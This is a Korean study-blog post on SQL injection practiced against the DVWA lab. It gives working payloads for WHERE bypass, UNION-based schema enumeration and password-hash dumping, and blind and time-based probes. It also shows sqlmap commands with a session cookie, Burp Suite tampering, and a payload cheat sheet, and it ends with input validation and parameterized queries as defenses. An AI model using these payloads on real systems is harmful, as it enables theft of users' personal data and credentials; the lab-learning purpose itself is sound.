---
title:  '[강의] 5주차 웹 해킹- 웹 해킹 기술 탐색 4'
excerpt: "week5"

categories:
  - hacking
tags: [study, virtualbox, kalilinux, hacking]

last_modified_at: 2021-07-23T08:06:00-05:00
classes: wide
---

### 6주간의 해킹 스터디 다섯번째 시간

벌써 5주차가 되었다. 시간이 참 빠른 것 같다. 내가 연구할 분야와는 관련이 없지만 알아두면 매우 좋을것 같아서 듣는 내내 유익해서 여기까지 온 것 같다 ㅎㅎ

강의링크는 오른쪽 클릭! => [goormedu](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)

<br>
이번 시간은 공격에 성공할 경우 큰 피해를 입힐 수 있는 SQL문 주입을 통해 데이터베이스를 조작하는 **SQL 인젝션 공격**에 대해 알아보겠습니다.

<hr>

### SQL 인젝션 공격

DB에 전송되는 SQL 쿼리문을 조작해 DB내의 데이터를 변조하거나 다른 사용자의 개인정보와 같이 허가되지 않은 정보에 접근하는 공격이다. 웹사이트의 회원정보 등 개인정보를 빼내는 공격으로 최근까지 꾸준히 사용된다고 한다.🥵🥵

SQL 인젝션 공격에는 기본 2가지가 있다. 

### 1. where 구문 공격

ID가 1인 사용자 정보를 요청하는 시나리오!

요청을 받으면 웹어플리케이션은 내부 DB로 조건문 `WHERE`을 포함하나 SQL 쿼리문을 전송하는데, 쿼리문을 해석해보면 ID=1 인 사용자의 이름과 이메일을 가져오라는 것이다.

이 쿼리가 실행이 되면 ID가 1인 사용자 정보가 웹어플리케이션을 통해 사용자에게 전송된다. 

![image](https://user-images.githubusercontent.com/53431568/126730025-8f3f63c4-b4b2-4a87-958e-73128e1df656.png)

이때! 해커가 1 뒤에 `' or '1'='1` 이런식으로 조작해서 보낸다. 즉, **'1'='1 이라는 항상 참**이되는 조건으로 조작을 해버린 것이다. 🥵🥵🥵

![image](https://user-images.githubusercontent.com/53431568/126730455-9a1af10f-d59e-4c40-a464-a2bf14e4ee4a.png)

결국 WHERE 구문이 우회가 되며 모든사용자의 개인정보를 반환하게 된다.

![image](https://user-images.githubusercontent.com/53431568/126730546-54b50da6-66c5-4bba-adcc-8308b3186c19.png)



### 2. UNION

똑같은 시나리오를 가정하자!

![image](https://user-images.githubusercontent.com/53431568/126730025-8f3f63c4-b4b2-4a87-958e-73128e1df656.png)

이번에 해커는 or 대신에 `union` 을 이용해 뒤에 PASSWORD를 요청하는 구문을 실행하였다.

아래 그림과 같이 union을 사이에 두고 SELECT 구문 두개가 배치되는 것을 볼 수 있다. => **`union은 합집합 개념으로 두개의 구문을 포함해 실행시킨다.`**

끝에 삽입된 #은 뒤에 오는 쿼리문을 생략한다는 뜻으로 해커가 원하는 명령어만 실행하여 공격할 수 있게 된다.🙀🙀 증말 흥미진진하다 ㅋㅋㅋ

![image](https://user-images.githubusercontent.com/53431568/126730690-03ad46b7-0063-4d21-9f11-d4839825affc.png)

이런식으로 정보를 빼내게 된다.

![image](https://user-images.githubusercontent.com/53431568/126730890-f88395e8-a76c-4ca6-9d17-9b3a2af79c23.png)


<br>

이제 재미있는 실습의 시간이다 ㅎㅎ

###  SQL 인젝션 공격 실습

### (1) LOW 단계 - WHERE

먼저 security를 low로 설정하고 SQL Injection 페이지에서 User ID: 1 을 입력하면 다음과 같이 정보가 출력된다.

![image](https://user-images.githubusercontent.com/53431568/126731020-c9dc323e-9e78-4471-a5f1-2a95a113e45e.png)

소스코드를 확인해 어떻게 동작하는지 알아보자!

다음과 같이 query 문을 보면 id가 들어오는 부분에 이미 `'$id'` 처럼 `작은따옴표 두개('')` 로 둘러쌓인것을 볼 수 있다. 

이 곳에 또 다른 작은따옴표가 들어오면 총 `user_id='''` 이런식으로 작은따옴표가 3개가 되어 에러가 발생한다. 한번 확인해보자!

![image](https://user-images.githubusercontent.com/53431568/126731183-4186e00b-b6b5-44d1-948d-f0922a8ecacc.png)


작은따옴표 ' 를 입력하였더니 정말 에러가 발생하였다. 이렇게 **비정상적인 문자를 입력했을 때 SQL쿼리문이 잘못되어 에러가 나면 해당 페이지는 SQL쿼리문을 사용하여 동작**한다는 것을 해커는 눈치챌 수 있으며 이것을 보고 SQL 쿼리문으로 공격할 수 있구나!! 라고 여지를 주게 되는 것이다.

![image](https://user-images.githubusercontent.com/53431568/126731075-df49a603-5c6e-4fef-b9d2-d3f207fc95c4.png)

이번엔 **1' or '1'='1**을 실행해보면 테이블의 모든 정보가 출력되었다.!! ID가 1이라는 것과 상관없이 모든 사용자의 정보가 나오게 된 것이다. 

![image](https://user-images.githubusercontent.com/53431568/126731533-22390548-dd64-41cd-bea2-80f8b15b7b0d.png)

위에서 설명한 # 을 이용하여 작은따옴표(')를 입력해도 에러가 발생하지 않게 해보자.
'ID' 이런식으로 작은따옴표 안에 ID가 감싸지므로 `**'#**` 을 입력한다면 ''id#' 으로 값이 들어가고 #뒤의 명령어는 주석처리 되므로 작은따옴표(')가 2개가 되어 에러가 발생하지 않게 되는 것이다.
 
![image](https://user-images.githubusercontent.com/53431568/126731668-6989cb9a-de8c-4a58-83f6-ac783bdbe99c.png)



### (1) LOW 단계 - UNION

UNION을 이용한다면 DB의 모든 정보를 알아낼 수 있다. UNION을 사용하려면 `**원래 쿼리문이 조회하는 SELECT문의 칼럼갯수**`와 `**UNION뒤의 SELECT문에서 요청하는 칼럼수**`가 같아야 한다. 아니면 에러발생! 

따라서 **원래 쿼리문이 몇개의 칼럼을 반환 하는지 알아내야 한다.** 

실행해보자! 다음과 같이 명령어를 입력하면... 
![image](https://user-images.githubusercontent.com/53431568/126732180-8989ba20-2282-4cb0-9bd4-9fda738ca14d.png)

칼럼수가 맞지 않는다는 경고 메세지를 보여준다.

![image](https://user-images.githubusercontent.com/53431568/126732164-2e94daea-17c2-4c10-83b6-7a01744f7e0d.png)

이번에는 칼럼 2개를 넣어보았더니 아래와 같이 결과가 출력되었다.! 즉, union 이전 쿼리문은 2개의 칼럼을 조회한다는 것을 알아내었다.

![image](https://user-images.githubusercontent.com/53431568/126732267-6f651c08-4da5-43a9-94ed-a47980280fea.png)

다른 방법을 이용해서도 칼럼갯수를 알 수 있다. 바로 `ORDER BY`라는 키워드를 이용하는 것이다. 이 키워드는 어떤 칼럼을 기준으로 정렬할때 쓰는 구문인데 칼럼의 갯수보다 크면 에러가 발생하게 된다. 따라서 원래 칼럼갯수를 맞출 수 있다. 

2일때, 

![image](https://user-images.githubusercontent.com/53431568/126732412-d6fe50ed-46c4-4b81-85a3-ef6f2fb0af6e.png)

3일때, 3이라는 칼럼을 알 수 없다라는 에러메세지를 출력한다. 따라서 2개의 칼럼까지 있다는 것을 알 수 있다. 
![image](https://user-images.githubusercontent.com/53431568/126732428-2d3c492c-92a4-46cb-9dd5-9f0b3d9c7e42.png)

이제 union 공격을 해보자!🙋🏽🙋🏽



#### 데이터베이스 명 조회

~~~sql 
1' union select schema_name,1 from information_schema.schemata #
~~~

![image](https://user-images.githubusercontent.com/53431568/126734180-ee4edb97-9856-46f9-9c3c-71c3d9ca07d5.png)


#### dvwa 데이터베이스의 테이블 명 조회

~~~sql 
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
~~~
 
위의 명령어를 통해 guestbook, users 라는 테이블이 있는 것을 확인할 수 있다. 개인정보가 있는것처럼 보이는 users 테이블을 살펴보도록 한다.
 
![image](https://user-images.githubusercontent.com/53431568/126734262-bc25ea5c-2802-4bd8-95bf-d94b0cbc18cb.png)


<br>

#### users 테이블 칼럼 조회
~~~sql 
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#
~~~ 

user_id, first name, surname, passwd 를 보여준다.

![image](https://user-images.githubusercontent.com/53431568/126734314-e90e55e6-27e0-42a2-bd36-83dff156ba39.png)


<br>

이제, users 테이블에서 사용자이름과 password 만 출력해보자!

~~~sql 
1' union select user,password from users#
~~~

아래와 같이 사용자명과 password가 surname에 해쉬값의 형태로 출력되었다.

![image](https://user-images.githubusercontent.com/53431568/126735858-c0236516-1178-405a-960f-28cb22592854.png)


구글탭에 해쉬값을 넣어 password를 알아보면 어떤 문자열인지 알 수 있다. 

![image](https://user-images.githubusercontent.com/53431568/126735889-1337e38b-b9a2-4f33-9408-3ce03156c98b.png)

이 중 아무사이트나 들어가서 확인하면 다음과 같이 해쉬값이 'password' 라는 것을 알려준다.

![image](https://user-images.githubusercontent.com/53431568/126735935-6aa6fc22-2456-4ab6-b08b-053c5e9626d4.png)


<br><br>

이 밖에도 다양한 명령어들로 공격을 할 수 있다. 명령어들을 정리해두었다.

<details markdown="1">
<summary>명령어 정리🔎</summary>

~~~sql 
-- WHERE 구문 우회
1' or '1'='1

-- UNION을 이용한 칼럼 갯수 알아내기
1' union select 1,1#

-- ORDER BY 구문을 이용한 칼럼 갯수 알아내기
1' order by 2#

-- 데이터베이스 명 조회
1' union select schema_name,1 from information_schema.schemata #

-- dvwa 데이터베이스의 테이블 명 조회
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #

-- users 테이블 칼럼 조회
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'# 

-- 블라인드 SQL 인젝션 참 구문
1' AND 1=1# 

-- 블라인드 SQL 인젝션 거짓 구문
1' AND 1=2#

-- 시간기반 블라인드 SQL 인젝션 탐지 구문
1' AND SLEEP(5)#
~~~
</details>

<br><br>

### (2) 블라인드 SQL 인젝션

사용자 정보를 알려준 대신 해당 아이디의 존재여부 정보만 알려준다. 1 을 입력하면 ID가 존재한다고 해준다.

![image](https://user-images.githubusercontent.com/53431568/126736153-a95761ea-2d93-43f7-8557-1f54032714aa.png)

존재하지 않는 ID 라면 다음과 같이 뜬다.

![image](https://user-images.githubusercontent.com/53431568/126736937-c6883f55-8717-4e0c-88ec-d3ddaaba38d7.png)


그렇다면 항상 참인 명제인 값을 아래와 같이 AND 뒤에 설정한다면 ID가 존재한다고 알려준다.

이런식으로 어떤 폼 뒤에 AND 와 같은 연산이 실행되고 있다면 SQL 쿼리문이 뒤에 위치한다는 힌트를 해커에게 주게 된다.

![image](https://user-images.githubusercontent.com/53431568/126737044-d5d2ca85-032a-4956-9829-b5e3427dc596.png)

<br>

#### 이것으로 무엇을 할 수 있는가❓❓

> 블라인드 SQL 인젝션은 비록 결과를 직접적으로 얻을 순 없지만, 만약 admin이라는 사용자가 존재하는지와 같이 어떤 명제를 제시하고 뒤에 AND를 붙여 다른 조건을 주어 그 명제가 참인지 거짓인지 알 수 있다. 이것은 시간이 오래걸리지만 일일히 대입해 어떤것이 있는지 없는지를 파악해 원하는 정보를 얻을 수 있다.
> 
<br>

**F12**키를 눌러 개발자 탭을 켜서 요청에 대한 걸린시간을 알아보자. Network 메뉴를 클릭! 

`1' AND sleep(5)#` 이라는 명령어를 입력하니 다음과 같이 걸린 시간을 알려준다. 약 5초정도가 걸렸다.

![image](https://user-images.githubusercontent.com/53431568/126737601-b36e7b63-1e11-4b92-ae0c-d8cd886a404e.png)


이번엔 존재하지 않는 ID인 6을 넣어 `6' AND sleep(5)#` 이라는 명령어를 입력했더니 응답이 아주 빠르게 온 것을 확인할 수 있다.

![image](https://user-images.githubusercontent.com/53431568/126737699-382c8ba5-725f-431f-bcf4-d5f6a1bc1d75.png)

> 💡 이런식으로 ID 1은 존재하고 6은 존재하지 않는 다는 것을 해커는 알아낼 수 있다.

<br><br>

### (3) SQLMAP

SQL 인젝션 공격 프로그램중 가장 대중적인 SQLMAP을 통해 자동으로 공격하는 방법을 알아보자!

먼저 SQLMAP 프로그램을 실행하자! 이 프로그램은 application -> webapplication 에 있다.

![image](https://user-images.githubusercontent.com/53431568/126737920-d06368cc-a62f-447c-9369-b66ac7372fde.png)

더블클릭하여 실행하면 다음과 같은 터미널 창이 뜬다.

![image](https://user-images.githubusercontent.com/53431568/126737965-ee0fa2cb-22ec-4a0d-8dca-58f4fa89e7b6.png)

이 창에 명령어를 실행할 건데 sqlmap -u 뒤에는 참인 값이 들어와야 하므로 SQL Injection (Blind) 페이지에서 id를 1로 입력했을 때의 주소를 복사해 붙여서 실행한다. 이때 뒤에 붙은 #은 없애도 상관없다.

![image](https://user-images.githubusercontent.com/53431568/126738272-2b1cc819-d77f-43ca-8a37-a66aea93eaaa.png)

이 뒤에 쿠키값을 넣어야 하는데, 쿠키를 알아내려면 F12로 개발자탭 활성화 후 Console 창으로 이동해 `document.cookie`를 입력한다. 출력된 메세지를 복사해 붙여준다.

![image](https://user-images.githubusercontent.com/53431568/126738493-a9fe1d0d-8d06-46e9-bcb4-39d07e26dffa.png)


최종적으로 입력할 명령어는 다음과 같다.

~~~sql
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=m6tod3hikjqo1u1pkm9973e6e0" 
~~~

명령어를 실행하자 마자 짧은 시간에 id parameter을 통해 AND boolean based blind 공격이 가능할 것 같다라는 메세지가 나온다. 또, 백엔드에서 사용한 DBMS의 언어가 MySQL이라는 것을 알아내었다.

그렇기 때문에 다른 DB에 대한 공격은 SKIP 할것인지에 대한 물음이 나오는데 -> `Y`를 선택하자

![image](https://user-images.githubusercontent.com/53431568/126738775-eb3b47c9-f23c-4e57-9466-e53980c8a9a0.png)

다음으로 MySQL에 대한 모든 테스트를 할것인지에 대한 물음도 -> `Y` 선택!

![image](https://user-images.githubusercontent.com/53431568/126738946-6d4392b9-d191-4619-8857-822c78b6d94b.png)


시간이 약간 걸린 후 또 다른 테스트를 할 것인지 나오는데 모두 `N` 을 선택하자

<br>

최종적으로 나온 화면이다. 이 프로그램이 지금 316개의 HTTP 요청을 자동으로 보냈었고, ID 라는 파라미터가 boolean-based blind공격과 AND/OR time-based blind 공격에 가능하다는 것을 알려주고 있다.

> **앞서 우리가 직접 하나씩 대입하며 공격하는 것을 SQLMAP 프로그램을 통해 자동화하여 한번에 공격**할 수 있는 것을 알 수 있다.

![image](https://user-images.githubusercontent.com/53431568/126738994-6e634a04-97d9-4add-8d82-f7ae9efde8f8.png)

다음은 여러 옵션 명령어들을 살펴보자! 🙋🏽🙋🏽

#### - 현재 DB 이름 알아내기

~~~sql
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=m6tod3hikjqo1u1pkm9973e6e0" --current-db
~~~

현재 DB 이름이 dvwa라는 것 확인!

![image](https://user-images.githubusercontent.com/53431568/126739370-20399d1a-8c59-4857-9c4d-f168a10d4dc4.png)

#### - 테이블 이름 알아내기

현재 DB 이름을 넣어서 그 DB의 테이블 이름을 알아낸다.

~~~sql
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=m6tod3hikjqo1u1pkm9973e6e0" -D dvwa --table
~~~

출력화면

![image](https://user-images.githubusercontent.com/53431568/126739579-4f4e789b-6474-4b4e-aaf2-faee5e55d3bc.png)




<br><br>


### (4) Medium 단계 

미디엄 단계에서는 직접입력이 아닌 값을 선택해야하는 것으로 설정해두었다. 이럴땐 intercept 기능으로 값을 바꾸는 것을 시도해볼 수 있다.

![image](https://user-images.githubusercontent.com/53431568/126739913-0427d1bc-daa8-4154-a47f-2997534277c2.png)

먼저, burpsuite를 켜서 `intercept is on`으로 설정해준다.

그리고 다음과 같이 id를 1로 submit 한 후, 값을 1'or'1='1로 변경해준다.

![image](https://user-images.githubusercontent.com/53431568/126740240-240320f7-2ea7-47d5-bbfc-0818315406c5.png)

forward 후 에러가 난 것을 확인!! 무엇이 문제일까? 소스코드를 보자

![image](https://user-images.githubusercontent.com/53431568/126740264-90a4a84a-8338-4ae3-9a9a-a8863bd5c56b.png)

소스코드를 보면 low 단계와는 달리 작은따옴표가 없는 것을 확인 할 수 있다. 이 말은 id 값으로는 더이상 문자열이 아니기 때문에 숫자 값만 나와야 한다는 것이다.

![image](https://user-images.githubusercontent.com/53431568/126740300-d9c3b9e0-8df0-433e-abff-da9fca8381ec.png)

그럼 다시 intercept를 통해서 or 1=1 값을 넣어준다. (⚠️띄어쓰기 주의!)

![image](https://user-images.githubusercontent.com/53431568/126740414-e0f2c3df-1419-4387-8db2-361f3aa67da1.png)

forward 후! 공격에 성공했다.

![image](https://user-images.githubusercontent.com/53431568/126740439-fcfae1e3-2ac1-4918-86ce-25867a63d7ca.png)

<br><br>

이번엔 union 공격도 성공할지 알아보자, 다시 intercept 후 id의 1 뒤에 `union select user,password from users#` 입력

![image](https://user-images.githubusercontent.com/53431568/126740562-bef78c37-3194-41b9-b599-1f4aae3f5aa8.png)

forward 성공!

![image](https://user-images.githubusercontent.com/53431568/126740608-b2141256-a2f1-47e4-966c-f793a2070407.png)


<br><br>


### (5) High 단계 

high 단계에서는 새로운 창에서 입력하도록 바뀌었다.

![image](https://user-images.githubusercontent.com/53431568/126740679-d205e3b7-0fd5-47be-9afe-a14311f13395.png)

소스코드를 보면 LIMIT이라는 키워드를 사용해 출력되는 레코드 수를 제한하고 있다. LIMIT 1 인 것은 하나만 출력하라는 뜻! 

공격을 하려면.. id 뒤에 주석처리면 하면 LIMIT는 적용되지 않기 때문에 무용지물이 된다... 조큼 허접한걸..?

![image](https://user-images.githubusercontent.com/53431568/126740822-ae5931e3-7f7a-44e4-bccd-22551939ba75.png)

이런식으로 뒤에 # 만 붙이면 공격 성공! 다시 말하지만 좀.. 허접쓰.. HIGH 맞아?

![image](https://user-images.githubusercontent.com/53431568/126740877-06961827-fd2e-4564-82e6-88f995eff555.png)



<br><br>

### SQL인젝션 공격 대응 👨‍🏫

impossible 단계의 소스코드를 보면서 알아보자

![image](https://user-images.githubusercontent.com/53431568/126741096-b763f58f-919d-40d0-91c7-eee003d3786d.png)


#### ⚠️ 대응을 위한 두가지 중요사항

> 1. **입력값을 제대로 검증한다.** 소스코드에서처럼 id가 숫자인지 확인을 한다. 필요한 데이터 형식을 정확히 검사하게 된다. 
> 2. **동적 쿼리가 아닌 파라미터 쿼리 사용!** 파라미터 쿼리를 사용해 사용자가 미리 쿼리문 형식을 작성하고 id 부분만 확인을 하게 되어 어떤것이 코드이고 어떤것이 데이터인지 알고있어 SQL쿼리문을 조작하지 못하게 막아 SQL인젝션 공격을 막을 수 있다.



<br><br>

#### 이미지 출처
  
[https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)
  





